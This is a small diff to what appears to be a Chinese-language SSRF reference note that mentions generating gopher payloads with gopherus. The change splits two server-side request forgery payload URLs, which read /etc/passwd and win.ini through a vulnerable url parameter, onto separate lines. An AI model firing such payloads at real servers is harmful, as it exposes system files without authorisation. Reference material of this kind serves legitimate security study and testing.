@@ -55,7 +55,8 @@ gopher:// 分布式文档传递服务，可使用gopherus生成payload
 ## payload
 
 ```
-http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini
+http://example.com/ssrf.php?url=file:///etc/passwd
+http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
 ```
 
 
